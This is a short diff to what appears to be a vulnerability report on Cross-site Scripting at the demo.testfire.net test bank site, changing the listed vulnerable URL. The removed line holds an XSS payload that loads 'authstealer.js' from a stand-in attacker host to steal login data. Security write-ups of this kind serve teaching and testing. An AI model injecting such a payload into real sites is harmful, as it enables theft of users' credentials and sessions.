@@ -21,8 +21,7 @@ Business value would be lost: Cross-site Scripting attacks essentially compromis
 
 
 ### 1.3. The URL of the website with the described vulnerability
-     http://demo.testfire.net/
-     <script%20src="http://mallorysevilsite.com/authstealer.js"></script> 
+     http://demo.testfire.net/bank/login.aspx
 
 
 ### 1.4. Steps taken to exploit the vulnerability
